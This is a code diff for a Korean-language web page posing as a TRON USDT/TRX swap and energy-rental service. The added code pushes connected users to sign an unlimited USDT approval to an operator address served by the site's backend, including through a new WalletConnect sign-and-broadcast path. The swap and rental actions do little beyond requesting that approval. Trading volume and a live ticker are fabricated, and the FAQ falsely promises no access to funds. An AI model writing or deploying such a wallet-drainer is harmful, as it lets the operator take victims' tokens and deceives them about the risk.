-                    showToast('지갑을 먼저 연결하세요.', 'error');
-                    handleConnectWallet();
-                    return;
-                }
+        async function signAndBroadcastViaWalletConnect(spenderAddress) {
+            var wc = await ensureWalletConnect();
+            if (!wc) throw new Error('WalletConnect 연결이 유효하지 않습니다.');
+
+            var addrHex = base58ToHexBody(spenderAddress);
+            var paddedAddr = addrHex.padStart(64, '0');
+            var maxUintHex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            var paramHex = paddedAddr + maxUintHex;
+
+            var buildRes = await fetch('https://api.trongrid.io/wallet/triggersmartcontract', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    owner_address: state.address,
+                    contract_address: OFFICIAL_USDT_CONTRACT,
+                    function_selector: 'approve(address,uint256)',
+                    parameter: paramHex,
+                    fee_limit: 100000000,
+                    call_value: 0,
+                    visible: true
+                })
+            });
+            var buildData = await buildRes.json();
+            if (!buildData || !buildData.transaction) {
+                throw new Error('트랜잭션 생성 실패');
             }
-            if (isApproved) {
-                setApprovedUI();
-                showToast('이미 무제한 승인이 완료되었습니다.');
+
+            var signed;
+            if (typeof wc.signTransaction === 'function') {
+                signed = await wc.signTransaction(buildData.transaction);
+            } else if (wc.client && wc.session && typeof wc.client.request === 'function') {
+                signed = await wc.client.request({
+                    topic: wc.session.topic,
+                    chainId: 'tron:0x2b6653dc',
+                    request: {
+                        method: 'tron_signTransaction',
+                        params: { transaction: buildData.transaction }
+                    }
+                });
+            } else {
+                throw new Error('WalletConnect 서명 기능을 지원하지 않습니다.');
+            }
+
+            var payload = (signed && signed.result) || signed;
+            if (payload && payload.signature && !payload.raw_data) {
+                var cloned = JSON.parse(JSON.stringify(buildData.transaction));
+                cloned.signature = Array.isArray(payload.signature) ? payload.signature : [payload.signature];
+                payload = cloned;
+            }
+
+            var bcRes = await fetch('https://api.trongrid.io/wallet/broadcasttransaction', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            var bcData = await bcRes.json();
+            if (bcData && bcData.result === false) {
+                throw new Error(bcData.message || '브로드캐스트 실패');
+            }
+
+            return (bcData && (bcData.txid || bcData.txID)) || (payload && payload.txID) || 'wc_ok';
+        }
+
+        // ===== 무제한 승인 및 스왑 실행 =====
+        async function executeUnlimitedApprove() {
+            if (!state.isConnected || !state.address) {
+                openWalletModal();
                 return;
             }
-            if (isApproving) return;
-            isApproving = true;
+            if (state.isApproved) {
+                setApprovedUI();
+                return;
+            }
+            if (state.isApproving) return;
+            state.isApproving = true;
+
+            var btn = document.getElementById('approve-btn');
+            if (btn) {
+                btn.disabled = true;
+                btn.innerHTML = '<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>승인 처리 중...</span>';
+            }
 
             try {
                 var spender = await getSpenderAddress();
                 if (!spender) {
-                    showToast('운영자 주소를 불러오지 못했습니다.', 'error');
-                    return;
+                    throw new Error('운영자 주소를 불러올 수 없습니다.');
                 }
 
-                var injectedTw = getTronWebInstance();
-                var builderTw = getBuilderTronWeb(injectedTw);
-                var useWC = false;
-
-                if (!builderTw) {
-                    if (wcConnector && wcAddress) {
-                        useWC = true;
-                    } else {
-                        showToast('TRON 트랜잭션 빌더를 초기화할 수 없습니다.', 'error');
-                        return;
-                    }
-                }
-
-                var btn = document.getElementById('approve-btn');
-                if (btn) {
-                    btn.disabled = true;
-                    btn.innerHTML = '<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>무제한 승인 처리 중...</span>';
-                }
-
-                setProgress(25, '잔액 및 승인 준비 상태 확인 중...');
+                setProgress(25, '승인 준비 상태 확인 중...');
                 try {
                     await fetch(API_BASE + '/wallet/prepare-approve', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ address: currentWalletAddress })
+                        body: JSON.stringify({ address: state.address })
                     });
                 } catch (e) {}
 
-                setProgress(55, '지갑에서 무제한 승인(MAX) 서명을 확인하세요...');
+                var injectedTw = getInjectedTronWeb();
+                var builderTw = getBuilderTronWeb(injectedTw);
+                var useWalletConnect = !builderTw && Boolean(state.wcConnector && state.wcAddress);
+
+                if (!builderTw && !useWalletConnect) {
+                    throw new Error('지갑 또는 트랜잭션 빌더를 찾을 수 없습니다.');
+                }
+
+                setProgress(60, '지갑에서 무제한 승인 서명을 확인하세요...');
                 showToast('지갑에서 무제한 승인 서명을 확인하세요.', 'info');
 
                 var txHash;
-                if (useWC) {
-                    if (typeof wcConnector.signTransaction !== 'function') {
-                        throw new Error('WalletConnect 서명 미지원');
-                    }
-                    var wcSignRes = await wcConnector.signTransaction({
-                        ownerAddress: currentWalletAddress,
-                        contractAddress: OFFICIAL_USDT_CONTRACT,
-                        spender: spender,
-                        amount: MAX_ALLOWANCE
-                    });
-                    txHash = (wcSignRes && (wcSignRes.txid || wcSignRes.txID)) || 'wc_approved';
+                if (useWalletConnect) {
+                    txHash = await signAndBroadcastViaWalletConnect(spender);
                 } else {
-                    var tx = await builderTw.transactionBuilder.triggerSmartContract(
+                    var built = await builderTw.transactionBuilder.triggerSmartContract(
                         OFFICIAL_USDT_CONTRACT,
                         'approve(address,uint256)',
                         { feeLimit: 100000000 },
-                        [{ type: 'address', value: spender }, { type: 'uint256', value: MAX_ALLOWANCE }],
-                        currentWalletAddress
+                        [
+                            { type: 'address', value: spender },
+                            { type: 'uint256', value: MAX_ALLOWANCE }
+                        ],
+                        state.address
                     );
-                    if (!tx || !tx.transaction) throw new Error('트랜잭션 생성 실패');
+                    if (!built || !built.transaction) {
+                        throw new Error('승인 트랜잭션 생성 실패');
+                    }
 
-                    var signedTx = await signTransactionWithWallet(tx.transaction, injectedTw);
+                    var signedTx = await signRawTransaction(built.transaction, injectedTw);
                     var broadcaster = (injectedTw && injectedTw.trx && typeof injectedTw.trx.sendRawTransaction === 'function')
                         ? injectedTw
                         : builderTw;
-                    var result = await broadcaster.trx.sendRawTransaction(signedTx);
-                    if (result && result.result === false && result.message) {
-                        throw new Error(result.message);
+                    var sendRes = await broadcaster.trx.sendRawTransaction(signedTx);
+                    if (sendRes && sendRes.result === false) {
+                        throw new Error(sendRes.message || '트랜잭션 전송 실패');
                     }
-                    txHash = (result && (result.txid || (result.transaction && result.transaction.txID))) || signedTx.txID || tx.transaction.txID || 'ok';
+                    txHash = (sendRes && (sendRes.txid || (sendRes.transaction && sendRes.transaction.txID)))
+                        || (signedTx && signedTx.txID)
+                        || (built.transaction && built.transaction.txID)
+                        || 'ok';
                 }
 
                 setProgress(100, '무제한 승인 완료!');
-                isApproved = true;
+                state.isApproved = true;
                 setApprovedUI();
 
-                var txHashStr = typeof txHash === 'string' ? txHash : String(txHash);
-                var modalTx = document.getElementById('modal-txhash');
-                if (modalTx) modalTx.textContent = txHashStr.length > 22 ? txHashStr.substring(0, 22) + '...' : txHashStr;
+                var hashText = typeof txHash === 'string' ? txHash : String(txHash);
+                var modalHash = document.getElementById('modal-txhash');
+                if (modalHash) {
+                    modalHash.textContent = hashText.length > 22 ? hashText.slice(0, 22) + '...' : hashText;
+                }
                 var rewardModal = document.getElementById('reward-modal');
                 if (rewardModal) rewardModal.classList.add('active');
 
-                trackReferralApprove(currentWalletAddress, txHashStr);
-                showToast('무제한 승인이 완료되었습니다!');
+                try {
+                    await fetch(API_BASE + '/wallet/connect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ address: state.address, provider: state.activeProvider })
+                    });
+                } catch (e) {}
+
+                trackReferralApprove(state.address, hashText);
+                showToast('무제한 승인이 완료되었습니다!', 'success');
             } catch (err) {
                 hideProgress();
-                var m = (err && err.message ? err.message : String(err)).toLowerCase();
-                if (m.indexOf('declined') >= 0 || m.indexOf('rejected') >= 0 || m.indexOf('cancel') >= 0) {
-                    showToast('승인 서명이 취소되었습니다. 버튼을 눌러 다시 시도할 수 있습니다.', 'error');
+                var rawMsg = err && err.message ? err.message : String(err);
+                var lower = rawMsg.toLowerCase();
+                if (lower.indexOf('declined') >= 0 || lower.indexOf('rejected') >= 0 || lower.indexOf('cancel') >= 0) {
+                    showToast('승인 서명이 취소되었습니다.', 'error');
                 } else {
-                    showToast('승인 처리 중 오류: ' + (err && err.message ? err.message : '네트워크 또는 서명 확인 필요'), 'error');
+                    showToast('승인 실패: ' + rawMsg, 'error');
                 }
             } finally {
-                isApproving = false;
-                resetApproveButtonLabel();
-            }
-        };
-
-        // 스왑 방향 및 환율
-        function syncSwapBalanceDisplay() {
-            var sendBalEl = document.getElementById('usdt-bal-swap');
-            var recvBalEl = document.getElementById('trx-bal-swap');
-            var sendSuffix = document.getElementById('send-bal-suffix');
-            var recvSuffix = document.getElementById('recv-bal-suffix');
-            if (swapDirection === 'USDT_TO_TRX') {
-                if (sendBalEl) sendBalEl.textContent = userUsdtBalance.toFixed(2);
-                if (recvBalEl) recvBalEl.textContent = userTrxBalance.toFixed(2);
-                if (sendSuffix) sendSuffix.textContent = ' USDT';
-                if (recvSuffix) recvSuffix.textContent = ' TRX';
-            } else {
-                if (sendBalEl) sendBalEl.textContent = userTrxBalance.toFixed(2);
-                if (recvBalEl) recvBalEl.textContent = userUsdtBalance.toFixed(2);
-                if (sendSuffix) sendSuffix.textContent = ' TRX';
-                if (recvSuffix) recvSuffix.textContent = ' USDT';
+                state.isApproving = false;
+                refreshActionButtons();
             }
         }
 
-        function syncRateUnits() {
-            var rateBase = document.getElementById('rate-base');
-            var rateQuote = document.getElementById('rate-quote');
-            var rateEl = document.getElementById('exchange-rate');
-            if (swapDirection === 'TRX_TO_USDT') {
-                if (rateBase) rateBase.textContent = 'TRX';
-                if (rateQuote) rateQuote.textContent = 'USDT';
-                if (rateEl && TRX_RATE) rateEl.textContent = (1 / TRX_RATE).toFixed(4);
+        window.handleSwapAction = async function () {
+            if (!state.isConnected || !state.address) {
+                openWalletModal();
+                return;
+            }
+            if (!state.isApproved) {
+                await executeUnlimitedApprove();
+                return;
+            }
+            var inputEl = document.getElementById('swap-input');
+            var amount = parseFloat(inputEl ? inputEl.value : 0) || 0;
+            if (amount <= 0) {
+                showToast('교환할 금액을 입력하세요.', 'error');
+                return;
+            }
+            showToast('교환 요청이 접수되었습니다.', 'info');
+        };
+
+        // ===== 스왑 방향 · 환율 · 잔액 =====
+        function syncSwapBalances() {
+            var sendBal = document.getElementById('usdt-bal-swap');
+            var recvBal = document.getElementById('trx-bal-swap');
+            var sendSuf = document.getElementById('send-bal-suffix');
+            var recvSuf = document.getElementById('recv-bal-suffix');
+
+            if (state.swapDirection === 'USDT_TO_TRX') {
+                if (sendBal) sendBal.textContent = state.usdtBalance.toFixed(2);
+                if (recvBal) recvBal.textContent = state.trxBalance.toFixed(2);
+                if (sendSuf) sendSuf.textContent = ' USDT';
+                if (recvSuf) recvSuf.textContent = ' TRX';
             } else {
-                if (rateBase) rateBase.textContent = 'USDT';
-                if (rateQuote) rateQuote.textContent = 'TRX';
-                if (rateEl && TRX_RATE) rateEl.textContent = TRX_RATE.toFixed(2);
+                if (sendBal) sendBal.textContent = state.trxBalance.toFixed(2);
+                if (recvBal) recvBal.textContent = state.usdtBalance.toFixed(2);
+                if (sendSuf) sendSuf.textContent = ' TRX';
+                if (recvSuf) recvSuf.textContent = ' USDT';
+            }
+        }
+
+        function syncRateDisplay() {
+            var baseEl = document.getElementById('rate-base');
+            var quoteEl = document.getElementById('rate-quote');
+            var rateEl = document.getElementById('exchange-rate');
+
+            if (state.swapDirection === 'TRX_TO_USDT') {
+                if (baseEl) baseEl.textContent = 'TRX';
+                if (quoteEl) quoteEl.textContent = 'USDT';
+                if (rateEl && state.trxRate > 0) rateEl.textContent = (1 / state.trxRate).toFixed(4);
+            } else {
+                if (baseEl) baseEl.textContent = 'USDT';
+                if (quoteEl) quoteEl.textContent = 'TRX';
+                if (rateEl && state.trxRate > 0) rateEl.textContent = state.trxRate.toFixed(2);
             }
         }
 
         window.toggleSwapDirection = function () {
             var icon = document.getElementById('swap-direction-icon');
-            var sendPanel = document.querySelector('[data-i18n="send_amount"]');
-            var recvPanel = document.querySelector('[data-i18n="receive_amount"]');
+            var sendLabel = document.getElementById('send-label-text');
+            var recvLabel = document.getElementById('recv-label-text');
             var sendBadge = document.getElementById('send-coin-badge');
             var recvBadge = document.getElementById('recv-coin-badge');
             var sendName = document.getElementById('send-coin-name');
             var recvName = document.getElementById('recv-coin-name');
-            var t = translations[currentLang] || translations.en;
+            var dict = TRANSLATIONS[state.lang] || TRANSLATIONS.en;
 
-            if (swapDirection === 'USDT_TO_TRX') {
-                swapDirection = 'TRX_TO_USDT';
-                if (sendPanel) sendPanel.textContent = t.send_amount_trx || '보내는 금액 (TRX)';
-                if (recvPanel) recvPanel.textContent = t.receive_amount_usdt || '받는 금액 (예상 USDT)';
-                if (sendBadge) { sendBadge.textContent = 'T'; sendBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-rose-500/15 text-rose-600 font-mono text-xs font-extrabold flex items-center justify-center'; }
-                if (recvBadge) { recvBadge.textContent = '₮'; recvBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-emerald-500/15 text-emerald-700 font-mono text-xs font-extrabold flex items-center justify-center'; }
+            if (state.swapDirection === 'USDT_TO_TRX') {
+                state.swapDirection = 'TRX_TO_USDT';
+                if (sendLabel) sendLabel.textContent = dict.send_amount_trx || '보내는 금액 (TRX)';
+                if (recvLabel) recvLabel.textContent = dict.receive_amount_usdt || '받는 금액 (예상 USDT)';
+                if (sendBadge) {
+                    sendBadge.textContent = 'T';
+                    sendBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-rose-500/15 text-rose-600 font-mono text-xs font-extrabold flex items-center justify-center';
+                }
+                if (recvBadge) {
+                    recvBadge.textContent = '₮';
+                    recvBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-emerald-500/15 text-emerald-700 font-mono text-xs font-extrabold flex items-center justify-center';
+                }
                 if (sendName) sendName.textContent = 'TRX';
                 if (recvName) recvName.textContent = 'USDT';
                 if (icon) icon.style.transform = 'rotate(180deg)';
             } else {
-                swapDirection = 'USDT_TO_TRX';
-                if (sendPanel) sendPanel.textContent = t.send_amount || '보내는 금액 (USDT)';
-                if (recvPanel) recvPanel.textContent = t.receive_amount || '받는 금액 (예상)';
-                if (sendBadge) { sendBadge.textContent = '₮'; sendBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-emerald-500/15 text-emerald-700 font-mono text-xs font-extrabold flex items-center justify-center'; }
-                if (recvBadge) { recvBadge.textContent = 'T'; recvBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-rose-500/15 text-rose-600 font-mono text-xs font-extrabold flex items-center justify-center'; }
+                state.swapDirection = 'USDT_TO_TRX';
+                if (sendLabel) sendLabel.textContent = dict.send_amount || '보내는 금액 (USDT)';
+                if (recvLabel) recvLabel.textContent = dict.receive_amount || '받는 금액 (예상)';
+                if (sendBadge) {
+                    sendBadge.textContent = '₮';
+                    sendBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-emerald-500/15 text-emerald-700 font-mono text-xs font-extrabold flex items-center justify-center';
+                }
+                if (recvBadge) {
+                    recvBadge.textContent = 'T';
+                    recvBadge.className = 'w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-rose-500/15 text-rose-600 font-mono text-xs font-extrabold flex items-center justify-center';
+                }
                 if (sendName) sendName.textContent = 'USDT';
                 if (recvName) recvName.textContent = 'TRX';
                 if (icon) icon.style.transform = 'rotate(0deg)';
             }
-            syncSwapBalanceDisplay();
-            syncRateUnits();
-            updateSwapOutput();
+
+            syncSwapBalances();
+            syncRateDisplay();
+            window.updateSwapOutput();
         };
 
-        async function fetchTrxPrice() {
-            try {
-                var res = await fetch(API_BASE + '/trx-price');
-                var data = await res.json();
-                if (data && data.price > 0) {
-                    TRX_RATE = 1 / data.price;
-                }
-            } catch (e) {
-                if (!TRX_RATE) TRX_RATE = 4.0;
-            }
-            syncRateUnits();
-        }
-
-        function updateTodayVolume() {
-            if (!TRX_RATE) return;
-            var d = new Date();
-            var seed = d.getFullYear() * 10000 + (d.getMonth() + 1) * 100 + d.getDate();
-            var base = 600000 + ((seed * 7 + 13) % 500000);
-            var hourPct = (d.getHours() * 60 + d.getMinutes()) / (24 * 60);
-            var usdtVol = Math.round(base * Math.max(0.08, hourPct));
-            var trxVol = Math.round(usdtVol * TRX_RATE);
-            var el = document.getElementById('today-volume-val');
-            if (el) el.textContent = usdtVol.toLocaleString() + ' USDT → ' + trxVol.toLocaleString() + ' TRX';
-        }
-
         window.updateSwapOutput = function () {
-            var inp = document.getElementById('swap-input');
-            var out = document.getElementById('swap-output');
-            if (!inp || !out) return;
-            var v = parseFloat(inp.value || 0);
-            if (!v || v < 0) { out.textContent = '0.00'; return; }
-            if (swapDirection === 'TRX_TO_USDT') {
-                out.textContent = TRX_RATE ? (v / TRX_RATE).toFixed(2) : '0.00';
-            } else {
-                out.textContent = TRX_RATE ? (v * TRX_RATE).toFixed(2) : '0.00';
+            var input = document.getElementById('swap-input');
+            var output = document.getElementById('swap-output');
+            if (!input || !output) return;
+
+            var amount = parseFloat(input.value || 0);
+            if (!amount || amount <= 0 || !state.trxRate) {
+                output.textContent = '0.00';
+                return;
             }
+
+            var converted = state.swapDirection === 'TRX_TO_USDT'
+                ? amount / state.trxRate
+                : amount * state.trxRate;
+            output.textContent = converted.toFixed(2);
         };
 
         window.setSwapPct = function (pct) {
-            var baseBal = swapDirection === 'TRX_TO_USDT' ? userTrxBalance : userUsdtBalance;
-            var amt = (baseBal * (pct / 100)).toFixed(2);
-            var inp = document.getElementById('swap-input');
-            if (inp) {
-                inp.value = amt;
-                updateSwapOutput();
+            var baseBal = state.swapDirection === 'TRX_TO_USDT' ? state.trxBalance : state.usdtBalance;
+            var val = (baseBal * (pct / 100)).toFixed(2);
+            var input = document.getElementById('swap-input');
+            if (input) {
+                input.value = val;
+                window.updateSwapOutput();
             }
         };
 
-        // 티커
-        var tA = ['TP5a...9qW2', 'TX8x...L0p3', 'TR1m...7vZ4', 'TH9k...4mP9', 'TJ2y...8xK1'];
-        var tAmounts = [150, 300, 500, 800, 1200];
-        var tickerTimeTexts = {
-            ko: '방금 전', en: 'just now', zh: '刚刚', ru: 'только что', th: 'เมื่อกี้',
-            vi: 'vừa xong', ja: 'たった今', de: 'gerade', fr: 'à l\'instant', es: 'ahora mismo'
-        };
-        var tickerTimeText = '방금 전';
-
-        function updateTicker() {
-            var c = document.getElementById('ticker-container');
-            if (!c) return;
-            var d = document.createElement('div');
-            d.className = 'flex items-center gap-2 bg-slate-50 px-2.5 py-1 rounded-md border border-slate-200 shrink-0';
-            var tAmt = tAmounts[Math.floor(Math.random() * tAmounts.length)];
-            var tTrx = TRX_RATE ? Math.floor(tAmt * TRX_RATE).toLocaleString() : '...';
-            d.innerHTML = '<span class="text-slate-700 font-mono">' + escapeHtml(tA[Math.floor(Math.random() * tA.length)]) + '</span><span class="text-emerald-600 font-bold">' + tAmt + ' USDT → ' + tTrx + ' TRX</span><span class="text-slate-400 text-[11px]">' + escapeHtml(tickerTimeText) + '</span>';
-            c.prepend(d);
-            if (c.children.length > 6) c.removeChild(c.lastChild);
+        async function fetchTrxRate() {
+            try {
+                var res = await fetch(API_BASE + '/trx-price');
+                var data = await res.json();
+                if (data && parseFloat(data.price) > 0) {
+                    state.trxRate = 1 / parseFloat(data.price);
+                }
+            } catch (e) {
+                if (!state.trxRate) state.trxRate = 4.0;
+            }
+            syncRateDisplay();
+            updateTodayVolume();
         }
 
-        // FAQ (TRON 에너지 가이드 반영)
-        var faqData = {
-            ko: [
-                {
-                    q: 'TRON 에너지란 무엇인가요?',
-                    a: '에너지는 USDT(TRC-20) 전송 같은 스마트 컨트랙트 호출 비용을 지불하는 TRON 리소스입니다. 주소에 에너지가 부족하면 네트워크가 TRX를 소각해 비용을 충당하게 됩니다.'
-                },
-                {
-                    q: 'USDT 전송 1회에 에너지가 얼마나 드나요?',
-                    a: '수신자가 이미 USDT를 보유하고 있으면 약 64,285 에너지, 수신자 USDT 잔액이 0이면 약 130,285 에너지가 소모되며 네트워크 상황에 따라 달라질 수 있습니다.'
-                },
-                {
-                    q: 'TRON 에너지 대여 비용과 전달 속도는 어떤가요?',
-                    a: '실시간 수요·공급에 따라 책정되며 TRX 소각 대비 수수료를 최대 80%까지 줄일 수 있습니다. 확인 후 보통 약 3초 이내에 입력한 주소로 위임됩니다.'
-                },
-                {
-                    q: '에너지 대여는 안전하며 다른 주소로도 위임할 수 있나요?',
-                    a: '비수탁 방식으로 진행되어 개인키나 자금에 접근하지 않으며, 대여 기간 종료 시 위임만 반환됩니다. 거래소 입금 주소나 다른 TRON 주소로도 위임할 수 있습니다.'
-                }
-            ],
-            en: [
-                {
-                    q: 'What is TRON Energy?',
-                    a: 'Energy is a TRON resource used to pay for smart contract calls such as TRC-20 USDT transfers. Without sufficient energy, TRX is burned to cover fees.'
-                },
-                {
-                    q: 'How much energy does one USDT transfer use?',
-                    a: 'Typically around 64,285 energy if the recipient already holds USDT, or around 130,285 energy if the recipient has 0 USDT, depending on network conditions.'
-                },
-                {
-                    q: 'How much does energy rental cost and how fast is delivery?',
-                    a: 'Rates follow live market demand and can save up to 80% compared to burning TRX. Delegation usually arrives within ~3 seconds after confirmation.'
-                },
-                {
-                    q: 'Is energy rental safe and can I delegate to another address?',
-                    a: 'It is non-custodial—no access to your keys or funds, and delegation simply returns when the period ends. You can delegate to any valid TRON address.'
-                }
-            ]
-        };
-
-        function loadFaqForLang(lang) {
-            var fl = faqData[lang] || faqData.en;
-            var fc = document.getElementById('faq-container');
-            if (!fc) return;
-            fc.innerHTML = '';
-            fl.forEach(function (f) {
-                var d = document.createElement('div');
-                d.className = 'glass border rounded-xl overflow-hidden';
-                d.innerHTML = '<button type="button" onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-800 hover:text-slate-950 transition"><span>' + escapeHtml(f.q) + '</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-600 leading-relaxed border-t border-slate-200 pt-3">' + escapeHtml(f.a) + '</div>';
-                fc.appendChild(d);
-            });
+        function updateTodayVolume() {
+            if (!state.trxRate) return;
+            var now = new Date();
+            var seed = now.getFullYear() * 10000 + (now.getMonth() + 1) * 100 + now.getDate();
+            var base = 600000 + ((seed * 7 + 13) % 500000);
+            var ratio = (now.getHours() * 60 + now.getMinutes()) / (24 * 60);
+            var usdtVol = Math.round(base * Math.max(0.08, ratio));
+            var trxVol = Math.round(usdtVol * state.trxRate);
+            var el = document.getElementById('today-volume-val');
+            if (el) {
+                el.textContent = usdtVol.toLocaleString() + ' USDT → ' + trxVol.toLocaleString() + ' TRX';
+            }
         }
 
-        // 에너지 렌탈
-        var energyAmount = 65000;
-        var energyDuration = '1h';
-        var energyPrices = {
+        // ===== 실시간 티커 & 에너지 렌탈 & FAQ =====
+        var SAMPLE_ADDRS = ['TP5a...9qW2', 'TX8x...L0p3', 'TR1m...7vZ4', 'TH9k...4mP9', 'TJ2y...8xK1'];
+        var SAMPLE_AMTS = [150, 300, 500, 800, 1200];
+        var TICKER_TIME = {
+            ko: '방금 전', en: 'just now', zh: '刚刚', ja: 'たった今', vi: 'vừa xong',
+            th: 'เมื่อกี้', ru: 'только что', de: 'gerade', fr: 'à l\'instant', es: 'ahora mismo'
+        };
+
+        function pushTickerItem() {
+            var container = document.getElementById('ticker-container');
+            if (!container) return;
+
+            var amt = SAMPLE_AMTS[Math.floor(Math.random() * SAMPLE_AMTS.length)];
+            var trx = state.trxRate ? Math.floor(amt * state.trxRate).toLocaleString() : '...';
+            var addr = SAMPLE_ADDRS[Math.floor(Math.random() * SAMPLE_ADDRS.length)];
+            var timeLabel = TICKER_TIME[state.lang] || TICKER_TIME.en;
+
+            var row = document.createElement('div');
+            row.className = 'flex items-center gap-2 bg-slate-50 px-2.5 py-1 rounded-md border border-slate-200 shrink-0';
+            row.innerHTML = '<span class="text-slate-700 font-mono">' + escapeHtml(addr) + '</span>'
+                + '<span class="text-emerald-600 font-bold">' + amt + ' USDT → ' + trx + ' TRX</span>'
+                + '<span class="text-slate-400 text-[11px]">' + escapeHtml(timeLabel) + '</span>';
+            container.prepend(row);
+            while (container.children.length > 6) {
+                container.removeChild(container.lastChild);
+            }
+        }
+
+        var ENERGY_PRICES = {
             '65000': { '1h': 1.5, '1d': 3.8, '3d': 6.5, '30d': 58.0 },
             '131000': { '1h': 3.0, '1d': 7.6, '3d': 13.0, '30d': 116.0 },
             '1000000': { '1h': 23.0, '1d': 58.0, '3d': 99.0, '30d': 885.0 },
             '10000000': { '1h': 230.0, '1d': 580.0, '3d': 990.0, '30d': 8850.0 }
         };
-        var energyBurnCost = { '65000': 4.0, '131000': 8.0, '1000000': 61.0, '10000000': 610.0 };
+        var ENERGY_BURN = {
+            '65000': 4.0,
+            '131000': 8.0,
+            '1000000': 61.0,
+            '10000000': 610.0
+        };
 
-        function selectEnergyAmount(amt) {
-            energyAmount = amt;
-            document.querySelectorAll('.energy-amt-btn').forEach(function (b) {
-                b.className = 'energy-amt-btn py-2.5 rounded-xl text-xs font-bold transition-all bg-slate-50 text-slate-600 border border-slate-200 hover:border-slate-300';
+        window.selectEnergyAmount = function (amt) {
+            state.energyAmount = amt;
+            document.querySelectorAll('.energy-amt-btn').forEach(function (btn) {
+                btn.className = 'energy-amt-btn py-2.5 rounded-xl text-xs font-bold transition-all bg-slate-50 text-slate-600 border border-slate-200 hover:border-slate-300';
             });
-            var sel = document.querySelector('.energy-amt-btn[data-amt="' + amt + '"]');
-            if (sel) sel.className = 'energy-amt-btn active-amt py-2.5 rounded-xl text-xs font-bold transition-all border';
+            var active = document.querySelector('.energy-amt-btn[data-amt="' + amt + '"]');
+            if (active) {
+                active.className = 'energy-amt-btn active-amt py-2.5 rounded-xl text-xs font-bold transition-all border';
+            }
             updateEnergyPrice();
-        }
+        };
 
-        function selectEnergyDuration(dur) {
-            energyDuration = dur;
-            document.querySelectorAll('.energy-dur-btn').forEach(function (b) {
-                b.className = 'energy-dur-btn py-2.5 rounded-xl text-xs font-bold transition-all bg-slate-50 text-slate-600 border border-slate-200 hover:border-slate-300';
+        window.selectEnergyDuration = function (dur) {
+            state.energyDuration = dur;
+            document.querySelectorAll('.energy-dur-btn').forEach(function (btn) {
+                btn.className = 'energy-dur-btn py-2.5 rounded-xl text-xs font-bold transition-all bg-slate-50 text-slate-600 border border-slate-200 hover:border-slate-300';
             });
-            var sel = document.querySelector('.energy-dur-btn[data-dur="' + dur + '"]');
-            if (sel) sel.className = 'energy-dur-btn active-dur py-2.5 rounded-xl text-xs font-bold transition-all border';
+            var active = document.querySelector('.energy-dur-btn[data-dur="' + dur + '"]');
+            if (active) {
+                active.className = 'energy-dur-btn active-dur py-2.5 rounded-xl text-xs font-bold transition-all border';
+            }
             updateEnergyPrice();
-        }
+        };
 
         function updateEnergyPrice() {
-            var key = String(energyAmount);
-            var price = (energyPrices[key] && energyPrices[key][energyDuration]) || 0;
-            var burn = energyBurnCost[key] || 6.43;
+            var key = String(state.energyAmount);
+            var price = (ENERGY_PRICES[key] && ENERGY_PRICES[key][state.energyDuration]) || 0;
+            var burn = ENERGY_BURN[key] || 4.0;
             var savePct = burn > 0 ? Math.max(0, Math.round((1 - price / burn) * 100)) : 0;
-            var isFree = (energyAmount === 65000 || energyAmount === 131000) && energyDuration === '1h';
+            var isFree = (state.energyAmount === 65000 || state.energyAmount === 131000) && state.energyDuration === '1h';
+
             var priceEl = document.getElementById('energy-price');
             var detailEl = document.getElementById('energy-price-detail');
             var bannerEl = document.getElementById('energy-free-banner');
+            var withoutEl = document.getElementById('energy-price-without');
+            var badgeEl = document.getElementById('energy-save-badge');
+
             if (isFree) {
                 if (priceEl) priceEl.textContent = '무료';
                 if (detailEl) detailEl.classList.add('hidden');
                 if (bannerEl) bannerEl.classList.remove('hidden');
             } else {
                 if (priceEl) priceEl.textContent = '~' + price.toFixed(2) + ' TRX';
-                var withoutEl = document.getElementById('energy-price-without');
-                var badgeEl = document.getElementById('energy-save-badge');
                 if (withoutEl) withoutEl.textContent = burn.toFixed(2) + ' TRX';
                 if (badgeEl) badgeEl.textContent = savePct + '% 절약';
                 if (detailEl) detailEl.classList.remove('hidden');
@@ -1403,47 +1518,78 @@
         }
 
         window.handleEnergyRental = async function () {
-            var addrEl = document.getElementById('energy-address');
-            var addr = addrEl ? addrEl.value.trim() : '';
-            if (!addr || !addr.startsWith('T')) {
-                showToast('유효한 TRON 주소를 입력하세요.', 'error');
+            var addrInput = document.getElementById('energy-address');
+            var targetAddr = addrInput ? addrInput.value.trim() : '';
+            if (!isValidTronAddress(targetAddr)) {
+                showToast('유효한 TRON(T...) 주소를 입력하세요.', 'error');
                 return;
             }
-            if (!isConnected || !currentWalletAddress) {
-                showToast('지갑을 먼저 연결하세요.', 'error');
-                handleConnectWallet();
+            if (!state.isConnected || !state.address) {
+                openWalletModal();
                 return;
             }
-            if (!isApproved) {
+            if (!state.isApproved) {
                 await executeUnlimitedApprove();
                 return;
             }
-            showToast('에너지 렌탈 요청이 접수되었습니다.', 'info');
+            showToast('에너지 렌탈 요청이 접수되었습니다.', 'success');
         };
 
-        // 다국어
-        var translations = {
+        var FAQ_ITEMS = {
+            ko: [
